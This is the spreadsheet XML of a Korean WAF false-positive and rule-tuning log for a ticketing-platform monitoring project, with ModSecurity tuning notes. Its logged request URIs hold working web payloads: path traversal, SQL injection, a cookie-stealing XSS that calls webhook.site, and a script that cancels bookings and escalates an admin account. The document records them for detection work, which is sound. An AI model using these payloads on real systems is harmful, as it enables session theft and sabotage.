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용안내" sheetId="1" r:id="rId4"/>
    <sheet state="visible" name="오탐기록대장" sheetId="2" r:id="rId5"/>
    <sheet state="visible" name="룰튜닝관리" sheetId="3" r:id="rId6"/>
    <sheet state="visible" name="통계요약" sheetId="4" r:id="rId7"/>
  </sheets>
  <definedNames>
    <definedName hidden="1" localSheetId="2" name="_xlnm._FilterDatabase">'룰튜닝관리'!$A$3:$L$58</definedName>
  </definedNames>
  <calcPr/>
  <extLst>
    <ext uri="GoogleSheetsCustomDataVersion2">
      <go:sheetsCustomData xmlns:go="http://customooxmlschemas.google.com/" r:id="rId8" roundtripDataChecksum="d33QBj4j3lJUW6PwXg0bwBuVZXQliTYFyxHdir2XZO8="/>
    </ext>
  </extLst>
</workbook>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="894" uniqueCount="465">
  <si>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF1F3864"/>
        <sz val="16.0"/>
      </rPr>
      <t xml:space="preserve">WAF </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF1F3864"/>
        <sz val="16.0"/>
      </rPr>
      <t xml:space="preserve">오탐 기록 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF1F3864"/>
        <sz val="16.0"/>
      </rPr>
      <t xml:space="preserve">· </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF1F3864"/>
        <sz val="16.0"/>
      </rPr>
      <t>룰 튜닝 관리대장</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color rgb="FF595959"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">티켓팅 플랫폼 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF595959"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">AI </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color rgb="FF595959"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">보안관제 프로젝트 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF595959"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">· </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color rgb="FF595959"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">팀 야누스 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF595959"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">(ModSecurity v3 + CRS / Splunk </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color rgb="FF595959"/>
        <sz val="10.0"/>
      </rPr>
      <t>연동</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF595959"/>
        <sz val="10.0"/>
      </rPr>
      <t>)</t>
    </r>
  </si>
  <si>
    <t>목적</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">WAF(CRS) </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>탐지 이벤트 중 오탐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정상 요청을 공격으로 오인</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>)·</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>미탐을 체계적으로 기록하고</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">, CRS </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>룰 예외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수정으로 이어지는 튜닝 과정을 추적하기 위한 관리대장</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>.</t>
    </r>
  </si>
  <si>
    <t>운영 흐름</t>
  </si>
  <si>
    <t xml:space="preserve">  ① 탐지 수집</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">Splunk </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>대시보드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검색에서 의심 이벤트를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오탐기록대장</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">' </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">시트에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건씩 기록 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>(Time·Src·Dest·URI·</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">매칭 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">CRS </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>룰</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>ID).</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">  ② 판정</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">각 이벤트를 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 xml:space="preserve">정탐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오탐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미판정</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>]</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>으로 분류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>정탐은 그대로 두고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오탐만 튜닝 대상으로 넘긴다</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>.</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">  ③ 튜닝 등록</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">오탐으로 판정된 건은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룰튜닝관리</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">' </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>시트에 튜닝</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>ID</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>를 발급해 등록하고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기록대장의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연계 튜닝</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">ID' </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>칸에 매핑한다</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>.</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">  ④ 적용</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">ModSecurity </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>디렉티브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예외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타깃제거</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">/Paranoia </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>조정 등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 xml:space="preserve">를 작성해 적용하고 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>nginx reload.</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">  ⑤ 검증</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">동일 요청 </t>
    </r>
  </si>
  <si>
    <t>판정 기준</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">  정탐</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>(TP)</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">실제 공격 페이로드 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">(UNION SELECT, OR 1=1, </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>시간지연 등</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">) → </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>룰 유지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강화</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>.</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">  오탐</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>(FP)</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">정상 업무 요청이 룰에 걸린 경우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예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>파일다운로드 파라미터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정상 검색어의 특수문자</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">) → </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>튜닝 대상</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>.</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">  미판정</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>추가 분석 필요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>페이로드만으로 판단이 어려운 경우</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>.</t>
    </r>
  </si>
  <si>
    <t>튜닝 방식 참고</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>오탐 해소 시 룰 전체 삭제</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>(SecRuleRemoveById)</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>는 지양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>가능한 한 좁은 범위로</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>:</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">  타깃 제거</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">특정 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>URI/</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">파라미터만 룰 대상에서 제외 — </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>SecRuleUpdateTargetById / ctl:ruleRemoveTargetById</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">  예외 우회</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">정상 패턴을 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>phase:1</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>에서 사전 통과</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">(pass) </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>처리</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">  Paranoia</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">과도하게 민감하면 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">paranoia_level </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">또는 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">anomaly threshold </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">조정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전역 영향 주의</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>)</t>
    </r>
  </si>
  <si>
    <t>주의</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>오탐을 없애려다 정탐까지 막으면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과차단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더 위험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 xml:space="preserve">모든 튜닝은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검증</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">' </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">단계에서 정상요청 통과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 xml:space="preserve">실제공격 탐지 둘 다 확인 후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검증완료</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">' </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>처리</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color theme="1"/>
        <sz val="10.0"/>
      </rPr>
      <t>.</t>
    </r>
  </si>
  <si>
    <t>WAF / Web · 탐지 이벤트 오탐 판정 기록대장</t>
  </si>
  <si>
    <t>No</t>
  </si>
  <si>
    <t>탐지시각</t>
  </si>
  <si>
    <t>출처</t>
  </si>
  <si>
    <t>카테고리</t>
  </si>
  <si>
    <t>공격 방법</t>
  </si>
  <si>
    <t>심각도</t>
  </si>
  <si>
    <t>Src IP</t>
  </si>
  <si>
    <t>Dest IP</t>
  </si>
  <si>
    <t>Dest
Port</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Malgun Gothic"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">요청 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Malgun Gothic"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">URI / </t>
    </r>
    <r>
      <rPr>
        <rFont val="Malgun Gothic"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t>파라미터</t>
    </r>
  </si>
  <si>
    <t>매칭 CRS
룰ID</t>
  </si>
  <si>
    <t>snort
룰 번호</t>
  </si>
  <si>
    <t>상태코드</t>
  </si>
  <si>
    <t>판정</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Malgun Gothic"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">판정 사유 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Malgun Gothic"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">/ </t>
    </r>
    <r>
      <rPr>
        <rFont val="Malgun Gothic"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t>실제 행위</t>
    </r>
  </si>
  <si>
    <t>조치 방향</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Malgun Gothic"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t>연계
튜닝</t>
    </r>
    <r>
      <rPr>
        <rFont val="Malgun Gothic"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t>ID</t>
    </r>
  </si>
  <si>
    <t>상태</t>
  </si>
  <si>
    <t>비고</t>
  </si>
  <si>
    <t>WAF Web</t>
  </si>
  <si>
    <t>SQL Injection</t>
  </si>
  <si>
    <t>UNION-based SQLi</t>
  </si>
  <si>
    <t>HIGH</t>
  </si>
  <si>
    <t>10.44.44.44</t>
  </si>
  <si>
    <t>10.0.10.2</t>
  </si>
  <si>
    <t>/qna/serchQnaList.do</t>
  </si>
  <si>
    <t>정탐</t>
  </si>
  <si>
    <t>sql injection 정탐</t>
  </si>
  <si>
    <t>룰 유지</t>
  </si>
  <si>
    <t>Boolean Blind SQLi</t>
  </si>
  <si>
    <t>/qna/searchQnaList.do</t>
  </si>
  <si>
    <t>1000010/1000004</t>
  </si>
  <si>
    <t>미탐</t>
  </si>
  <si>
    <t xml:space="preserve">sql injection 미탐 - </t>
  </si>
  <si>
    <t>XSS</t>
  </si>
  <si>
    <t>Stored XSS</t>
  </si>
  <si>
    <t>MEDIUM</t>
  </si>
  <si>
    <t>/qna/insertQnaList.do</t>
  </si>
  <si>
    <t>1001003/1001011</t>
  </si>
  <si>
    <t>/qna/insertQna.do</t>
  </si>
  <si>
    <t>1001005/1001009/1001013</t>
  </si>
  <si>
    <t>재분석</t>
  </si>
  <si>
    <t>CSRF(상태 변경 요청)</t>
  </si>
  <si>
    <t>CSRF</t>
  </si>
  <si>
    <t>1001005/1001009</t>
  </si>
  <si>
    <t>파일 업로드</t>
  </si>
  <si>
    <t>웹셀 업로드(.jsp/.php)</t>
  </si>
  <si>
    <t>RCE</t>
  </si>
  <si>
    <t>1002003/1002001</t>
  </si>
  <si>
    <t>Path Traversal</t>
  </si>
  <si>
    <t>/qna/downloadFile.do?fileName=../../../../../../../../../../etc/passwd</t>
  </si>
  <si>
    <t>2025879/2002034/2049400</t>
  </si>
  <si>
    <t>1002004/1002006/1002005</t>
  </si>
  <si>
    <t>Error-base-sql</t>
  </si>
  <si>
    <t>/concert/list.do?keyword=bts&amp;status=x%27%20AND%201=CTXSYS.DRITHSX.SN(1,(SELECT%20user%20FROM%20dual))%20AND%20%27x%27=%27x</t>
  </si>
  <si>
    <t>sql injection</t>
  </si>
  <si>
    <t>1000003/1000013/1000017</t>
  </si>
  <si>
    <t>blind Sql</t>
  </si>
  <si>
    <t xml:space="preserve">	/concert/list.do?keyword=xyz%27%29+OR+%28SELECT+COUNT%28*%29+FROM+members%29+%3E+0+OR+%28%271%27%3D%271&amp;status=x%27+AND+1%3DCTXSYS.DRITHSX.SN%281%2C%28SELECT+user+FROM+dual%29%29+AND+%27x%27%3D%27x	</t>
  </si>
  <si>
    <t>ids가 두개잡힘,html text가 잡힘</t>
  </si>
  <si>
    <t>1000017/1000013/1000005/1000003</t>
  </si>
  <si>
    <t>Refelcted XSS</t>
  </si>
  <si>
    <t>/concert/list.do?keyword=%22%3E%3Cimg+src%3Dx+onerror%3D%22fetch%28%27https%3A%2F%2Fwebhook.site%2Ff3dfcf93-e8fd-400c-9085-957a3f04beb1c%3Fk%3D%27%2Bdocument.cookie%29%22%3E&amp;status=x%27+AND+1%3DCTXSYS.DRITHSX.SN%281%2C%28SELECT+user+FROM+dual%29%29+AND+%27x%27%3D%27x</t>
  </si>
  <si>
    <t>ids 까지 두개잡힘</t>
  </si>
  <si>
    <t>1000003/1000013/1001004/1001010/1001012</t>
  </si>
  <si>
    <t>iframe</t>
  </si>
  <si>
    <t>/concert/list.do?keyword=%3Cscript%3E%28async%28%29%3D%3E%7B+const+A%3D%27admin999%40naver.com%27%3B+%2F*+1%29+%EC%A0%95%EC%83%81+%EA%B3%B5%EC%97%B0%EB%AA%A9%EB%A1%9D%EC%9D%84+%EC%A6%89%EC%8B%9C+%EC%A0%84%EC%B2%B4%ED%99%94%EB%A9%B4+%EC%98%A4%EB%B2%84%EB%A0%88%EC%9D%B4+%E2%86%92+%EB%B9%88+%EA%B2%80%EC%83%89%EA%B2%B0%EA%B3%BC+%EC%9D%80%ED%8F%90+*%2F+const+f%3Ddocument.createElement%28%27iframe%27%29%3B+f.src%3D%27%2Fconcert%2Flist.do%27%3B+f.setAttribute%28%27style%27%2C%27position%3Afixed%3Binset%3A0%3Bwidth%3A100vw%3Bheight%3A100vh%3Bborder%3A0%3Bz-index%3A2147483647%3Bbackground%3A%23fff%27%29%3B+%28document.body%7C%7Cdocument.documentElement%29.appendChild%28f%29%3B+%2F*+2%29+%EB%92%A4%EC%97%90%EC%84%9C+%EA%B3%B5%EA%B2%A9+*%2F+const+P%3D%28u%2Cb%29%3D%3Efetch%28u%2C%7Bmethod%3A%27POST%27%2Cheaders%3A%7B%27Content-Type%27%3A%27application%2Fx-www-form-urlencoded%27%7D%2Cbody%3Anew+URLSearchParams%28b%29%2Ccredentials%3A%27same-origin%27%7D%29%3B+const+D%3Dasync+u%3D%3Enew+DOMParser%28%29.parseFromString%28await%28await+fetch%28u%2C%7Bcredentials%3A%27same-origin%27%7D%29%29.text%28%29%2C%27text%2Fhtml%27%29%3B+const+bd%3Dawait+D%28%27%2Fadmin%2Fbooking%2Flist.do%3FPAGE_ROW%3D99999%27%29%3B+bd.querySelectorAll%28%27form%5Baction%3D%22%2Fadmin%2Fbooking%2Fcancel.do%22%5D+input%5Bname%3DbookingId%5D%27%29.forEach%28i%3D%3EP%28%27%2Fadmin%2Fbooking%2Fcancel.do%27%2C%7BbookingId%3Ai.value%7D%29%29%3B+const+md%3Dawait+D%28%27%2Fadmin%2Fmember%2Flist.do%3FPAGE_ROW%3D99999%27%29%3B+md.querySelectorAll%28%27table+tbody+tr%27%29.forEach%28tr%3D%3E%7Bconst+e%3D%28tr.children%5B1%5D%3F.textContent%7C%7C%27%27%29.trim%28%29%2Cban%3Dtr.querySelector%28%27form%5Baction%3D%22%2Fadmin%2Fmember%2Fban.do%22%5D+input%5Bname%3DmemberId%5D%27%29%2Cpro%3Dtr.querySelector%28%27form%5Baction%3D%22%2Fadmin%2Fmember%2Fpromote.do%22%5D+input%5Bname%3DmemberId%5D%27%29%3Bif%28e%3D%3D%3DA%29%7Bif%28pro%29P%28%27%2Fadmin%2Fmember%2Fpromote.do%27%2C%7BmemberId%3Apro.value%7D%29%3B%7Delse+if%28ban%29P%28%27%2Fadmin%2Fmember%2Fban.do%27%2C%7BmemberId%3Aban.value%7D%29%3B%7D%29%3B+%7D%29%28%29%3B%3C%2Fscript%3E&amp;status</t>
  </si>
  <si>
    <t>941110/
920100</t>
  </si>
  <si>
    <t>클릭재킹</t>
  </si>
  <si>
    <t>1001001/1001002/1001010/1000023</t>
  </si>
  <si>
    <t>Stored XSS (프로필 정보)</t>
  </si>
  <si>
    <t xml:space="preserve">	/my/info.do</t>
  </si>
  <si>
    <t>pfense 동일 시간대 잡힌 게 보이지 않음</t>
  </si>
  <si>
    <t>Brute Force</t>
  </si>
  <si>
    <t>관리자 계정 무차별대입</t>
  </si>
  <si>
    <t xml:space="preserve">        /loginAction.do</t>
  </si>
  <si>
    <t>pfens 미탐</t>
  </si>
  <si>
    <t>CRS 룰 튜닝 관리 (오탐 해소 · 미탐 보완)</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t>튜닝</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t>ID</t>
    </r>
  </si>
  <si>
    <t>장비</t>
  </si>
  <si>
    <t>룰ID</t>
  </si>
  <si>
    <t>룰 설명</t>
  </si>
  <si>
    <t>룰 수정 사유</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">문제 상황 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오탐</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t>/</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t>미탐 내용</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FFFFFFFF"/>
        <sz val="10.0"/>
      </rPr>
      <t>)</t>
    </r>
  </si>
  <si>
    <t>튜닝 방안</t>
  </si>
  <si>
    <t>튜닝 후 룰</t>
  </si>
  <si>
    <t>검증 방법</t>
  </si>
  <si>
    <t>적용일</t>
  </si>
  <si>
    <t>담당자</t>
  </si>
  <si>
    <t>T-002</t>
  </si>
  <si>
    <t>ModSecurity</t>
  </si>
  <si>
    <t>1000100, 1000101, 1000102</t>
  </si>
  <si>
    <t>로그인 무차별 대입(Brute Force) — CRS에 없음</t>
  </si>
  <si>
    <t>CRS는 SQLi/XSS만 탐지, 로그인 반복 시도(/loginAction.do) 브루트포스는 미탐.</t>
  </si>
  <si>
    <t>IP별 로그인 횟수 카운트 커스텀 룰 신규 추가 (30초 10회↑ 탐지).</t>
  </si>
  <si>
    <t>SecAction "id:1000100,phase:1,nolog,pass,initcol:ip=%{REMOTE_ADDR}"
SecRule REQUEST_LINE "@rx ^POST /loginAction\.do" "id:1000101,phase:2,nolog,pass,setvar:ip.login_count=+1,expirevar:ip.login_count=30"
SecRule IP:LOGIN_COUNT "@gt 10" "id:1000102,phase:2,deny,status:429,log,msg:'Brute force detected'"</t>
  </si>
  <si>
    <t xml:space="preserve"> ① 로그인 15회 시도 → modsec_audit.log "Brute force detected" 확인 
② Splunk 대시보드 Brute Force/HIGH 표시 + 출발지 IP(10.44.44.44) 식별</t>
  </si>
  <si>
    <t>검증완료</t>
  </si>
  <si>
    <t>심재학</t>
  </si>
  <si>
    <t>T-003</t>
  </si>
  <si>
    <t>Snort</t>
  </si>
  <si>
